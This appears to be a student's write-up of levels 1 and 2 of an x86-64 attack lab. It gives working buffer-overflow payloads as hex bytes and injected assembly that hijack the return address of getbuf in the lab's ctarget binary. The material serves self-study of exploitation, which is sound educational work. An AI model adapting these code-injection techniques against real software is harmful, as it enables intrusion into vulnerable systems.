# Attack Lab
This is an x86-64 attack lab for self-study students.

I also document what I had to do to solve this lab.

## Tools
- GDB
- objdump
- GCC

## Level 1
This is a simple buffer overflow exploit. You can see the dump of the ctarget binary [here](./dump_ctarget.txt). We need to exploit the vulnerability in [getbuf](./dump_ctarget.txt#L777). The first instruction is the key here. `sub $0x28,%rsp` means we will need to provide 40 bytes before we can modify the return address located in the stack. In the 40th byte, we will give the address of the function [touch1](./dump_ctarget.txt#L787) in little endian format (`c0 17 40 00 00 00 00 00`). Hence, we get the following answer:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

## Level 2
Similar to level 1 except we need to add the instruction to store our cookie in register `%rdi`. We need to execute few instructions before we transfer control to touch2. For this, we will need the 40-47 bytes to contain the address pointing back into the stack that contains the *buffer* (0-39 bytes from getbuf). The buffer will be modified in such a way that it will update the value of register %rdi (the first argument to the function), and then hand over the control to touch2. To get to the function touch2, we will use the `retq` instruction. Recall that `retq` pops the value from the stack and into the register `%rip` (register which holds the memory address to the next instruction to execute). This means we will have to push the address of touch2 into our stack. This push will modify the return address located in our stack (bytes 40-47), which will allow our exploit to safely transfer the control. The instructions we will execute will look like this:
```asm
0:	68 ec 17 40 00       	pushq  $0x4017ec           /* Push address of touch2 to stack  */
5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi    /* Move cookie to register %rdi */
c:	c3                   	retq   
d:	90                   	nop
e:	90                   	nop
f:	90                   	nop
```

Our answer will then, look like this:
```
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3 90 90 90
ec 17 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```
